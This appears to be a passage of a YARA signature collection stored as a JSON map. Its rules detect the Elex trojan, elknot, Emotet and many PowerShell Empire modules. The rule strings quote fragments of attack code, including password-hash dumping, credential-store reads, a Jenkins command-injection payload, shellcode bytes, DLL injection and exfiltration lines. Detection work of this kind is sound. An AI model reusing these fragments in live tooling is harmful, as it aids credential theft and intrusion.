  "Trj_Elex_Service64": "rule Trj_Elex_Service64 \n{\n    \n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex Service 64 bits\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = \"http://xa.xingcloud.com/v4/sof-everything/\"\n        $str2 = \"http://www.mysearch123.com\"\n        $str3 = \"21e223b3f0c97db3c281da1g7zccaefozzjcktmlma\"\n        \n    condition:\n        (pe.machine == pe.MACHINE_AMD64) and ($mz at 0) and ($str1) and ($str2) and ($str3)\n}",
  "Trj_Elex_Dll32": "rule Trj_Elex_Dll32 \n{\n\n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex DLL 32 bits\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = {59 00 72 00 72 00 65 00 68 00 73 00}\n        $str2 = \"RookIE/1.0\"\n        \n    condition:\n        (pe.machine == pe.MACHINE_I386) and (pe.characteristics & pe.DLL) and ($mz at 0) and ($str1) and ($str2)\n}",
  "Trj_Elex_Dll64": "rule Trj_Elex_Dll64 \n{\n\n    meta:\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        description = \"Elex DLL 64 bits\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $str1 = {59 00 72 00 72 00 65 00 68 00 73 00}\n        $str2 = \"RookIE/1.0\"\n        \n    condition:\n        (pe.machine == pe.MACHINE_AMD64) and (pe.characteristics & pe.DLL) and ($mz at 0) and ($str1) and ($str2)\n}",
  "elknot_xor": "rule elknot_xor : malware \n{\nmeta:\n    author = \"liuya@360.cn\"\n    date = \"2016-04-25\"\n    description = \"elknot/Billgates variants with XOR like C2 encryption scheme\"\n    reference = \"http://liuya0904.blogspot.tw/2016/04/new-elknotbillgates-variant-with-xor.html\"\n    sample = \"474429d9da170e733213940acc9a2b1c, 2579aa65a28c32778790ec1c673abc49\"\n\nstrings:\n   //md5=474429d9da170e733213940acc9a2b1c\n   /*\n   seg000:08130801 68 00 09 13 08                          push    offset dword_8130900\n    seg000:08130806 83 3D 30 17 13 08 02                    cmp     ds:dword_8131730, 2\n    seg000:0813080D 75 07                                   jnz     short loc_8130816\n    seg000:0813080F 81 04 24 00 01 00 00                    add     dword ptr [esp], 100h\n    seg000:08130816                         loc_8130816:                           \n    seg000:08130816 50                                      push    eax\n    seg000:08130817 E8 15 00 00 00                          call    sub_8130831\n    seg000:0813081C E9 C8 F6 F5 FF                          jmp     near ptr 808FEE9h\n   */\n    $decrypt_c2_func_1 = {08 83 [5] 02 75 07 81 04 24 00 01 00 00 50 e8 [4] e9}\n\n    // md5=2579aa65a28c32778790ec1c673abc49\n    /*\n    .rodata:08104D20 E8 00 00 00 00                          call    $+5\n    .rodata:08104D25 87 1C 24                                xchg    ebx, [esp+4+var_4] ;\n    .rodata:08104D28 83 EB 05                                sub     ebx, 5\n    .rodata:08104D2B 8D 83 00 FD FF FF                       lea     eax, [ebx-300h]\n    .rodata:08104D31 83 BB 10 CA 02 00 02                    cmp     dword ptr [ebx+2CA10h], 2\n    .rodata:08104D38 75 05                                   jnz     short loc_8104D3F\n    .rodata:08104D3A 05 00 01 00 00                          add     eax, 100h\n    .rodata:08104D3F                         loc_8104D3F:                           \n    .rodata:08104D3F 50                                      push    eax\n    .rodata:08104D40 FF 74 24 10                             push    [esp+8+strsVector]\n*/\n$decrypt_c2_func_2 = {e8 00 00 00 00 87 [2] 83 eb 05 8d 83 [4] 83 bb [4] 02 75 05}\n\ncondition:\n    1 of ($decrypt_c2_func_*)\n}",
  "Emotets": "rule Emotets{\nmeta:\n  author = \"pekeinfo\"\n  date = \"2017-10-18\"\n  description = \"Emotets\"\nstrings:\n  $mz = { 4d 5a }\n  $cmovnz={ 0f 45 fb 0f 45 de }\n  $mov_esp_0={ C7 04 24 00 00 00 00 89 44 24 0? }\n  $_eax={ 89 E? 8D ?? 24 ?? 89 ?? FF D0 83 EC 04 }\ncondition:\n  ($mz at 0 and $_eax in( 0x2854..0x4000)) and ($cmovnz or $mov_esp_0)\n}",
  "Empire_Invoke_MetasploitPayload": "rule Empire_Invoke_MetasploitPayload {\n   meta:\n      description = \"Detects Empire component - file Invoke-MetasploitPayload.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"a85ca27537ebeb79601b885b35ddff6431860b5852c6a664d32a321782808c54\"\n   strings:\n      $s1 = \"$ProcessInfo.Arguments=\\\"-nop -c $DownloadCradle\\\"\" fullword ascii\n      $s2 = \"$PowershellExe=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 9KB and 1 of them ) or all of them\n}",
  "Empire_Exploit_Jenkins": "rule Empire_Exploit_Jenkins {\n   meta:\n      description = \"Detects Empire component - file Exploit-Jenkins.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729\"\n   strings:\n      $s1 = \"$postdata=\\\"script=println+new+ProcessBuilder%28%27\\\"+$($Cmd)+\\\"\" ascii\n      $s2 = \"$url = \\\"http://\\\"+$($Rhost)+\\\":\\\"+$($Port)+\\\"/script\\\"\" fullword ascii\n      $s3 = \"$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x6620 and filesize < 7KB and 1 of them ) or all of them\n}",
  "Empire_Get_SecurityPackages": "rule Empire_Get_SecurityPackages {\n   meta:\n      description = \"Detects Empire component - file Get-SecurityPackages.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1\"\n   strings:\n      $s1 = \"$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)\" fullword ascii\n      $s2 = \"$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_PowerDump": "rule Empire_Invoke_PowerDump {\n   meta:\n      description = \"Detects Empire component - file Invoke-PowerDump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1\"\n   strings:\n      $x16 = \"$enc = Get-PostHashdumpScript\" fullword ascii\n      $x19 = \"$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;\" fullword ascii\n      $x20 = \"$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2023 and filesize < 60KB and 1 of them ) or all of them\n}",
  "Empire_Install_SSP": "rule Empire_Install_SSP {\n   meta:\n      description = \"Detects Empire component - file Install-SSP.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"7fd921a23950334257dda57b99e03c1e1594d736aab2dbfe9583f99cd9b1d165\"\n   strings:\n      $s1 = \"Install-SSP -Path .\\\\mimilib.dll\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_ShellcodeMSIL": "rule Empire_Invoke_ShellcodeMSIL {\n   meta:\n      description = \"Detects Empire component - file Invoke-ShellcodeMSIL.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f\"\n   strings:\n      $s1 = \"$FinalShellcode.Length\" fullword ascii\n      $s2 = \"@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)\" fullword ascii\n      $s3 = \"@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,\" fullword ascii\n      $s4 = \"$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}",
  "Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp": "rule Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp {\n   meta:\n      description = \"Detects Empire component - file PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c\"\n   strings:\n      $x2 = \"$PoolPasswordCmd = 'c:\\\\windows\\\\system32\\\\inetsrv\\\\appcmd.exe list apppool\" fullword ascii\n   condition:\n      ( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_Mimikatz_Gen": "rule Empire_Invoke_Mimikatz_Gen {\n   meta:\n      description = \"Detects Empire component - file Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n   strings:\n      $s1 = \"= \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ\" ascii\n      $s2 = \"Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_Get_GPPPassword": "",
  "Empire_Invoke_SmbScanner": "rule Empire_Invoke_SmbScanner {\n   meta:\n      description = \"Detects Empire component - file Invoke-SmbScanner.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd\"\n   strings:\n      $s1 = \"$up = Test-Connection -count 1 -Quiet -ComputerName $Computer \" fullword ascii\n      $s2 = \"$out | add-member Noteproperty 'Password' $Password\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}",
  "Empire_Exploit_JBoss": "rule Empire_Exploit_JBoss {\n   meta:\n      description = \"Detects Empire component - file Exploit-JBoss.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"9ea3e00b299e644551d90bbee0ce3e4e82445aa15dab7adb7fcc0b7f1fe4e653\"\n   strings:\n      $s1 = \"Exploit-JBoss\" fullword ascii\n      $s2 = \"$URL = \\\"http$($SSL)://\\\" + $($Rhost) + ':' + $($Port)\" ascii\n      $s3 = \"\\\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service\" ascii\n      $s4 = \"http://blog.rvrsh3ll.net\" fullword ascii\n      $s5 = \"Remote URL to your own WARFile to deploy.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}",
  "Empire_dumpCredStore": "rule Empire_dumpCredStore {\n   meta:\n      description = \"Detects Empire component - file dumpCredStore.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350\"\n   strings:\n      $x1 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true, EntryPoint = \\\"CredReadW\\\"\" ascii\n      $s12 = \"[String] $Msg = \\\"Failed to enumerate credentials store for user '$Env:UserName'\\\"\" fullword ascii\n      $s15 = \"Rtn = CredRead(\\\"Target\\\", CRED_TYPE.GENERIC, out Cred);\" fullword ascii\n   condition:\n      ( uint16(0) == 0x233c and filesize < 40KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_EgressCheck": "rule Empire_Invoke_EgressCheck {\n   meta:\n      description = \"Detects Empire component - file Invoke-EgressCheck.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534\"\n   strings:\n      $s1 = \"egress -ip $ip -port $c -delay $delay -protocol $protocol\" fullword ascii\n   condition:\n      ( uint16(0) == 0x233c and filesize < 10KB and 1 of them ) or all of them\n}",
  "Empire_ReflectivePick_x64_orig": "rule Empire_ReflectivePick_x64_orig {\n   meta:\n      description = \"Detects Empire component - file ReflectivePick_x64_orig.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"a8c1b108a67e7fc09f81bd160c3bafb526caf3dbbaf008efb9a96f4151756ff2\"\n   strings:\n      $s1 = \"\\\\PowerShellRunner.pdb\" fullword ascii\n      $s2 = \"PowerShellRunner.dll\" fullword wide\n      $s3 = \"ReflectivePick_x64.dll\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them ) or all of them\n}",
  "Empire_Out_Minidump": "rule Empire_Out_Minidump {\n   meta:\n      description = \"Detects Empire component - file Out-Minidump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1\"\n   strings:\n      $s1 = \"$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\" fullword ascii\n      $s2 = \"$ProcessFileName = \\\"$($ProcessName)_$($ProcessId).dmp\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_PsExec": "rule Empire_Invoke_PsExec {\n   meta:\n      description = \"Detects Empire component - file Invoke-PsExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88\"\n   strings:\n      $s1 = \"Invoke-PsExecCmd\" fullword ascii\n      $s2 = \"\\\"[*] Executing service .EXE\" fullword ascii\n      $s3 = \"$cmd = \\\"%COMSPEC% /C echo $Command ^> %systemroot%\\\\Temp\\\\\" ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 50KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_PostExfil": "rule Empire_Invoke_PostExfil {\n   meta:\n      description = \"Detects Empire component - file Invoke-PostExfil.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e\"\n   strings:\n      $s1 = \"# upload to a specified exfil URI\" fullword ascii\n      $s2 = \"Server path to exfil to.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x490a and filesize < 2KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_SMBAutoBrute": "rule Empire_Invoke_SMBAutoBrute {\n   meta:\n      description = \"Detects Empire component - file Invoke-SMBAutoBrute.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2\"\n   strings:\n      $s1 = \"[*] PDC: LAB-2008-DC1.lab.com\" fullword ascii\n      $s2 = \"$attempts = Get-UserBadPwdCount $userid $dcs\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}",
  "Empire_Get_Keystrokes": "rule Empire_Get_Keystrokes {\n   meta:\n      description = \"Detects Empire component - file Get-Keystrokes.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"c36e71db39f6852f78df1fa3f67e8c8a188bf951e96500911e9907ee895bf8ad\"\n   strings:\n      $s1 = \"$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_DllInjection": "rule Empire_Invoke_DllInjection {\n   meta:\n      description = \"Detects Empire component - file Invoke-DllInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0\"\n   strings:\n      $s1 = \"-Dll evil.dll\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 40KB and 1 of them ) or all of them\n}",
  "Empire_KeePassConfig": "rule Empire_KeePassConfig {\n   meta:\n      description = \"Detects Empire component - file KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3\"\n   strings:\n      $s1 = \"$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_SSHCommand": "rule Empire_Invoke_SSHCommand {\n   meta:\n      description = \"Detects Empire component - file Invoke-SSHCommand.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      hash1 = \"cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242\"\n   strings:\n      $s1 = \"$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA\" ascii\n      $s2 = \"Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \\\"id\\\"\" fullword ascii\n      $s3 = \"Write-Verbose \\\"[*] Error loading dll\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x660a and filesize < 2000KB and 1 of them ) or all of them\n}",
  "Empire_PowerShell_Framework_Gen1": "rule Empire_PowerShell_Framework_Gen1 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash3 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash4 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash5 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"Write-BytesToMemory -Bytes $Shellcode\" ascii\n      $s2 = \"$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_PowerUp_Gen": "rule Empire_PowerUp_Gen {\n   meta:\n      description = \"Detects Empire component - from files PowerUp.ps1, PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c\"\n   strings:\n      $s1 = \"$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath\" fullword ascii\n      $s2 = \"$Result = sc.exe pause $($TargetService.Name)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}",
  "Empire_PowerShell_Framework_Gen2": "rule Empire_PowerShell_Framework_Gen2 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash3 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash5 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash6 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash8 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $x1 = \"$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\" fullword ascii\n      $s20 = \"#Shellcode: CallDllMain.asm\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_Agent_Gen": "rule Empire_Agent_Gen {\n   meta:\n      description = \"Detects Empire component - from files agent.ps1, agent.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db\"\n      hash2 = \"380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db\"\n   strings:\n      $s1 = \"$wc.Headers.Add(\\\"User-Agent\\\",$script:UserAgent)\" fullword ascii\n      $s2 = \"$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)\" fullword ascii\n      $s3 = \"if ($script:AgentDelay -ne 0){\" fullword ascii\n   condition:\n      ( uint16(0) == 0x660a and filesize < 100KB and 1 of them ) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen3 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash3 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash4 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"if (($PEInfo.FileType -ieq \\\"DLL\\\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\" fullword ascii\n      $s2 = \"remote DLL injection\" ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_InveighRelay_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41\"\n   strings:\n      $s1 = \"$inveigh.SMBRelay_failed_list.Add(\\\"$HTTP_NTLM_domain_string\\\\$HTTP_NTLM_user_string $SMBRelayTarget\\\")\" fullword ascii\n      $s2 = \"$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 200KB and 1 of them ) or all of them\n}\n\nrule Empire_KeePassConfig_Gen {\n   meta:\n      description = \"Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3\"\n   strings:\n      $s1 = \"$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_Portscan_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3\"\n   strings:\n      $s1 = \"Test-Port -h $h -p $Port -timeout $Timeout\" fullword ascii\n      $s2 = \"1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 100KB and 1 of them ) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen4 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-BypassUAC.ps1, Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DllInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PsExec.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"743c51334f17751cfd881be84b56f648edbdaf31f8186de88d094892edc644a9\"\n      hash2 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash3 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash4 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash5 = \"304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0\"\n      hash6 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash7 = \"0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88\"\n      hash8 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash9 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n      hash10 = \"fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438\"\n   strings:\n      $s1 = \"Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }\" fullword ascii\n      $s2 = \"# Get a handle to the module specified\" fullword ascii\n      $s3 = \"$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\" fullword ascii\n      $s4 = \"$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}\n\nrule Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n   strings:\n      $s1 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\" fullword ascii\n      $s2 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}\n\nrule 